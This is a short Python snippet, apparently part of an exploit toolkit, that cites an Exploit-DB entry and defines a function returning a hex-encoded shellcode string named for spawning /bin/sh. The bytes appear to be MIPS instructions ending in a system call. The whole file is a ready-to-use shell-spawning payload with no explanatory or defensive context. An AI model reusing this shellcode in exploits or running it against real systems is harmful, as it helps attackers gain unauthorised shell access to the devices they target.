#https://www.exploit-db.com/exploits/35868/
def bin_sh():
	shellcode =  r"\xff\xff"
	shellcode += r"\x06\x28\xff\xff\xd0"
	shellcode += r"\x04\xff\xff\x05\x28"
	shellcode += r"\x01\x10\xe4\x27\x0f"
	shellcode += r"\xf0\x84\x24\xab\x0f"
	shellcode += r"\x02\x24\x0c\x01\x01\x01"
	return shellcode
